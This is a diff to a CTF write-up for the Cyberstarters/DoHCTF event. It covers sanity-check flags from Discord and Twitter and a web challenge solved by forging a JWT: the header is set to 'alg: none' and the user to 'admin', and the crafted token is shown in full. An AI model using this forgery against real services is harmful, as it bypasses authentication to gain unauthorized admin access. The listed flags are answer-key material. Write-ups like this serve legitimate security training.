@@ -1,9 +1,6 @@
 # Cyberstarters-Ctf
 
-# Sanity Check
-1.Discord 
-2.c
-3.Twitter 
+# SANITY CHECK
 
 # Discord
 ![Discord](https://user-images.githubusercontent.com/51336409/235458307-32f46d31-36a5-4068-a210-8b316ddc8af0.png)
@@ -16,3 +13,52 @@ So running this command *echo 'RG9IQ1RGe3RyeV90b19iZV9oYWNrdGl2ZV9vbl9kaXNjb3JkX
 ![Screenshot_2023-05-01_09_34_23](https://user-images.githubusercontent.com/51336409/235458940-391c7304-14d7-43c1-af8b-55122c535f48.png)
 
 This is really easy and quick, the flag has already been given, which is the name of the challenge, so the flag is "DoHCTF{_colwSPs:(}"
+
+# Twitter
+![Screenshot_2023-05-01_09_18_46](https://user-images.githubusercontent.com/51336409/235459330-7e656a38-ef32-4373-9785-cc8ff56b8bc2.png)
+
+The flag for this is just Simply "Yes"
+
+
+# WEB
+
+# None Shall Pass
+![Screenshot_2023-05-01_09_44_05](https://user-images.githubusercontent.com/51336409/235460203-60fe4967-5259-42e8-a99a-9623a3352d11.png)
+
+Following the link *https://diaryofhackers-jwtvuln.chals.io/ink* We got to the website
+
+Going to the websites cookie![Screenshot_2023-05-01_09_45_45](https://user-images.githubusercontent.com/51336409/235460434-ff29a3f1-f9a9-4a37-a315-1129cc5ce610.png)
+
+I got this jwt Token *eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.iJ9U4tIUxxLbbOb_YXVkpvkBqtPsFtAxWIvmcakDfL0*
+
+The token has three part(taking note of the dots) and they are all in Base64, but we are concerned with the first two which are:
+
+# Base64                                                     # Decoded
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9                          {"alg":"HS256","typ":"JWT"}
+eyJ1c2VybmFtZSI6Imd1ZXN0In0                                    {"username":"guest"}
+
+So what we are going to do now is that we are going to chane do some changes which will look like this:
+
+{"alg":"none","typ":"JWT"}
+{"username":"admin"}
+
+Now we base64 encode them back:
+"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0="
+"eyJ1c2VybmFtZSI6ImFkbWluIn0="
+
+Now that we have new enocded strings we join them together with dots, and we also remember the third part of the original token.
+So the new token will looklike this:
+
+"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=.eyJ1c2VybmFtZSI6ImFkbWluIn0=.iJ9U4tIUxxLbbOb_YXVkpvkBqtPsFtAxWIvmcakDfL0"
+
+Replace it with the original token in the using the devtools. Then you get your flag
+![Screenshot_2023-05-01_10_02_57](https://user-images.githubusercontent.com/51336409/235463374-0c1b9e21-3f9f-4a87-ba9a-d969be8c8e8c.png)
+"DoHCTF{jwt_has_a_none_algo_loll}"
+
+
+
+
+
+
+
+
